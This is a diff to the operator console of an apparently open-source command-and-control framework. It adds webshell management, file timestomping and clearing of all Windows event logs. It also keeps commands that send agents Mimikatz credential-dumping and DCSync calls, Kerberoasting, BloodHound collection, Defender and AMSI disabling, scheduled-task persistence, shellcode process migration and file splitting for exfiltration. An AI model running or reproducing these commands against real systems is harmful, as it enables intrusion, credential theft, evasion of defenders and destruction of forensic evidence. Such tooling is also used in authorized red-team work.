@@ -7,12 +7,17 @@ from core.Obfuscate import *
 from core.Encryption import *
 from core import webserver
 from lib import prettytable
+from core import webshell
+from prettytable import PrettyTable
 from core.color import bcolors
 from core.color import *
+from tabulate import tabulate
 import time
 import os
 import donut
 import glob
+import _thread
+import pickle
 
 def Command_Completer(text, state):
     options = [i for i in cmd.COMMANDS if i.startswith(text)]
@@ -57,7 +62,14 @@ class cmd:
      'migrate',
      'processlist',
      'split',
-     'join']
+     'join',
+     'webshell_mode',
+     'register_webshell',
+     'list_webshells',
+     'list_agents',
+     'generate_webshell',
+     'time_stomp',
+     'clear_all_logs']
 
     HELPCOMMANDS = [['exit', 'Exit the console , or kill the agent '],
      ['list', 'List all agents'],
@@ -93,7 +105,13 @@ class cmd:
      ['migrate', 'migrate to new process ( default nslookup ) to hide the backdoor '],
      ['processlist', 'list processes formated ( Name , ID , Commandline)'],
      ['split', 'split file to small size files for data exfiltration (use join command for files in current server or use join.ps1 script to join data on windows )'],
-     ['join', 'join splited file names ( include the original file name in the path and the script will know the file parts)']]
+     ['join', 'join splited file names ( include the original file name in the path and the script will know the file parts)'],
+     ['webshell_mode', 'enter webshell mode to register and control your shells)'],
+     ['register_webshell', 'register webshell to be controlled : register_webshell <URL> <KEY>)'],
+     ['list_webshells', 'list all webshells registered )'],
+     ['list_agents', 'list all agents )'],
+     ['time_stomp', 'change the ( access , modify , creation ) time of destination file as same as the source file ) . Usage time_stomp < source path > < destination path >'],
+     ['clear_all_logs', 'this command will clear all windows event logs in the system']]
 
     def help(self, args = None):
         table = prettytable.PrettyTable([bcolors.BOLD + 'Command' + bcolors.ENDC, bcolors.BOLD + 'Description' + bcolors.ENDC])
@@ -108,11 +126,23 @@ class cmd:
     def exit(self, args = None):
         if config.get_pointer()=='main':
             os._exit(0)
+        if config.get_pointer()=='webshell' or config.Implant_Type=='webshell':
+            config.set_pointer('main')
+            config.Implant_Type=''
+            with open('.webshells', 'wb') as f:
+                pickle.dump(config.WEBSHELLS, f)
         else:
             #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"exit"))
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"kill "+config.AGENTS[config.get_pointer()][8]))
 
     def list(self, args = None):
+        if config.Implant_Type=='webshell':
+            cmd.list_webshells(self)
+        else:
+            cmd.list_agents(self)
+
+
+    def list_agents(self, args=None):
         table = prettytable.PrettyTable([bcolors.BOLD + 'ID' + bcolors.ENDC,
          bcolors.BOLD + 'Status' + bcolors.ENDC,
          bcolors.BOLD + 'ExternalIP' + bcolors.ENDC,
@@ -147,15 +177,33 @@ class cmd:
 
         print (table)
 
+
     def use(self, args = None):
-        if len(args) < 2:
-            return
-        id = args[1]
-        for i in config.AGENTS:
-            if id == str(config.AGENTS[i][0]):
-                id = i
-                config.set_pointer(i)
-                break
+        if config.get_pointer()=='webshell':
+            if len(args) < 2:
+                return
+            id = args[1]
+            for i in config.WEBSHELLS:
+                if id == config.WEBSHELLS[i][0]:
+                    id = i
+                    config.set_pointer(i)
+                    config.Implant_Type='webshell'
+                    break
+        else:
+            if len(args) < 2:
+                return
+            id = args[1]
+            for i in config.AGENTS:
+                if id == str(config.AGENTS[i][0]):
+                    id = i
+                    config.set_pointer(i)
+                    config.Implant_Type='agent'
+                    break
+
+    def webshell_mode(self, args = None):
+        config.set_pointer('webshell')
+        config.Implant_Type='webshell'
+
 
     def kill_all(self, args = None):
         if config.get_pointer()!='main':
@@ -185,7 +233,11 @@ class cmd:
             del config.AGENTS[agent]
 
     def back(self, args = None):
-        config.set_pointer('main')
+        if config.Implant_Type=='webshell':
+            config.set_pointer('webshell')
+        else:
+            config.set_pointer('main')
+            config.Implant_Type=''
 
     def payload(self, args = None):
         for i in config.PAYLOADS:
@@ -249,6 +301,9 @@ class cmd:
             print ("you can't use this command in main ! chose an agent")
             return
         #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
+            return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load PowerView.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load DA.ps1"))
 
@@ -257,6 +312,9 @@ class cmd:
             print ("you can't use this command in main ! chose an agent")
             return
         #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
+            return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Find-PSServiceAccounts.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Kerberoast.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load kerb.ps1"))
@@ -264,6 +322,9 @@ class cmd:
     def dcsync_admins(self, args=None):
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
+            return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
             return
         print ("grab some coffe this may take too long to finish if the domain admin users are more than 10")
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
@@ -273,6 +334,9 @@ class cmd:
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
             return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
+            return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""Invoke-Mimikatz -Command '"lsadump::dcsync /domain:{domain} /all /csv"'""".replace("{domain}",config.AGENTS[config.get_pointer()][6])))
 
@@ -280,6 +344,9 @@ class cmd:
     def dcsync_list(self, args=None):
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
+            return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
             return
         user=[]
         try :
@@ -304,6 +371,9 @@ class cmd:
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
             return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
+            return
         try :
             if len(args) < 2:
                 print ("Usage get_groups <user name>")
@@ -318,6 +388,9 @@ class cmd:
     def get_users(self, args=None):
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
+            return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
             return
         try :
             if len(args) < 2:
@@ -334,6 +407,9 @@ class cmd:
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
             return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
+            return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load SharpHound.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Invoke-BloodHound -CollectionMethod All -NoSaveCache -RandomFilenames -ZipFileName "+"".join([random.choice(string.ascii_uppercase) for i in range(5)])))
 
@@ -341,11 +417,17 @@ class cmd:
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
             return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
+            return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Set-MpPreference -DisableRealtimeMonitoring 1"))
 
     def dis_amsi(self, args=None):
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
+            return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
             return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load AMSI_Bypass.ps1"))
 
@@ -353,12 +435,18 @@ class cmd:
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
             return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
+            return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'"""))
 
     def persist_schtasks(self, args=None):
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
+            return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
             return
         CC=''
         while len(CC) == 0:
@@ -397,6 +485,9 @@ class cmd:
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
             return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
+            return
         f=open("agents/screenshot.ninja","r")
         payload=f.read()
         f.close()
@@ -416,43 +507,52 @@ class cmd:
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
             return
-        f=open("agents/upload.ninja","r")
-        payload=f.read()
-        f.close()
-        if SSL==True:
-            payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{upload}', upload_url).replace('{HTTP}', "https")
+        if config.Implant_Type=='webshell':
+            _thread.start_new_thread( webshell.upload_file, (config.WEBSHELLS[config.POINTER],args, ) )
         else:
-            payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{upload}', upload_url).replace('{HTTP}', "http")
-        f=open("Modules/upload.ps1","w")
-        f.write(payload)
-        f.close()
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load upload.ps1"))
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"up -filename \""+args[1]+"\""))
+            f=open("agents/upload.ninja","r")
+            payload=f.read()
+            f.close()
+            if SSL==True:
+                payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{upload}', upload_url).replace('{HTTP}', "https")
+            else:
+                payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{upload}', upload_url).replace('{HTTP}', "http")
+            f=open("Modules/upload.ps1","w")
+            f.write(payload)
+            f.close()
+            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load upload.ps1"))
+            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"up -filename \""+args[1]+"\""))
 
 
     def download(self, args=None):
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
             return
-        global loaded
-        f=open("agents/download.ninja","r")
-        payload=f.read()
-        f.close()
-        if SSL==True:
-            payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{download}', download_url).replace('{HTTP}', "https")
+        if config.Implant_Type=='webshell':
+            _thread.start_new_thread( webshell.download_file, (config.WEBSHELLS[config.POINTER],args, ) )
         else:
-            payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{download}', download_url).replace('{HTTP}', "http")
-        f=open("Modules/download.ps1","w")
-        f.write(payload)
-        f.close()
-        #if loaded["download"]==False:
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load download.ps1"))
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"dn -filename \""+args[1]+"\""))
+            global loaded
+            f=open("agents/download.ninja","r")
+            payload=f.read()
+            f.close()
+            if SSL==True:
+                payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{download}', download_url).replace('{HTTP}', "https")
+            else:
+                payload=payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{download}', download_url).replace('{HTTP}', "http")
+            f=open("Modules/download.ps1","w")
+            f.write(payload)
+            f.close()
+            #if loaded["download"]==False:
+            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load download.ps1"))
+            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"dn -filename \""+args[1]+"\""))
 
 
     def set_beacon(self, args=None):
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
+            return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
             return
         global loaded
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"$exchange="+args[1]))
@@ -461,6 +561,9 @@ class cmd:
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
             return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
+            return
         global loaded
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"loadpsh payload-obf.ps1"))
 
@@ -468,6 +571,9 @@ class cmd:
     def migrate(self, args=None):
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
+            return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
             return
         global loaded
         shellcode=donut.create(file="payloads/dropper_cs.exe")
@@ -483,12 +589,18 @@ class cmd:
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
             return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
+            return
 
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Get-WmiObject Win32_Process  | select Name,ProcessId,CommandLine | Format-Table -Wrap -AutoSize"))
 
     def split(self, args=None):
         if config.get_pointer()=='main':
             print ("you can't use this command in main ! chose an agent")
+            return
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
             return
         MB=''
         if len(args) < 2:
@@ -511,7 +623,9 @@ class cmd:
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"split -path "+path+" -chunksize "+str(Bytes)))
 
     def join(self, args=None):
-
+        if config.Implant_Type!='agent':
+            print("This command can only be used in agent mode")
+            return
         if len(args) < 2:
             print ("Usage join <full Dir path with original file name at the end of path>")
             return
@@ -530,3 +644,52 @@ class cmd:
 
                     outfile.write(infile.read())
         outfile.close()
+
+    def register_webshell(self, args=None):
+        if config.get_pointer()!='webshell':
+            print ("you can only use this command in webshell mode !")
+            return
+        if len(args) < 3:
+            print ("Usage register_webshell <URL> <Key>")
+            return
+
+        URL=args[1]
+        KEY=args[2]
+
+        config.WEBSHELLS.update({config.WEBSHELL_COUNT:[str(config.WEBSHELL_COUNT+1),URL,KEY]})
+        config.WEBSHELL_COUNT=config.WEBSHELL_COUNT+1
+
+    def list_webshells(self, args=None):
+        t=PrettyTable(['id','URL', 'KEY'])
+        for i in config.WEBSHELLS:
+            table=config.WEBSHELLS[i]
+            #table.insert(0,i)
+            t.add_row(table)
+        print(t)
+
+    def generate_webshell(self, args=None):
+        webshell.generate_webshell()
+
+    def time_stomp(self, args=None):
+        if config.Implant_Type=='webshell' and config.get_pointer()!='webshell' and config.get_pointer()!='main':
+            _thread.start_new_thread( webshell.time_stomp, (config.WEBSHELLS[config.POINTER],args, ) )
+
+        if config.Implant_Type=='agent' and config.get_pointer()!='webshell' and config.get_pointer()!='main':
+            if len(args)<3:
+                print("Usage : time_stomp <path of the file you want to have same ( access , modify , creation ) date > < destination file to edit its date >")
+                return
+            else:
+
+                Commands="$(Get-item {Dest_Path}).creationtime=$(Get-item {Src_Path} ).creationtime;$(Get-item {Dest_Path}).lastaccesstime=$(Get-item {Src_Path} ).lastaccesstime;$(Get-item {Dest_Path}).lastwritetime=$(Get-item {Src_Path} ).lastwritetime"
+                Commands=Commands.replace("{Src_Path}",args[1]).replace("{Dest_Path}",args[2])
+                config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,Commands))
+
+    def clear_all_logs(self,args=None):
+        if config.Implant_Type=='webshell' and config.get_pointer()!='webshell' and config.get_pointer()!='main':
+            _thread.start_new_thread( webshell.webshell_execute, (config.WEBSHELLS[config.POINTER],["""wevtutil cl "Windows PowerShell" """], ) )
+            _thread.start_new_thread( webshell.webshell_execute, (config.WEBSHELLS[config.POINTER],["""for /f %x in ('wevtutil el') do (wevtutil cl "%x")"""], ) )
+
+        if config.Implant_Type=='agent' and config.get_pointer()!='webshell' and config.get_pointer()!='main':
+            #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""wevtutil cl "Windows PowerShell" """))
+            #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""for /f %x in ('wevtutil el') do wevtutil cl "%x" """))
+            config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""wevtutil el | Foreach-Object {Write-Host "Clearing $_"; wevtutil cl "$_"}"""))
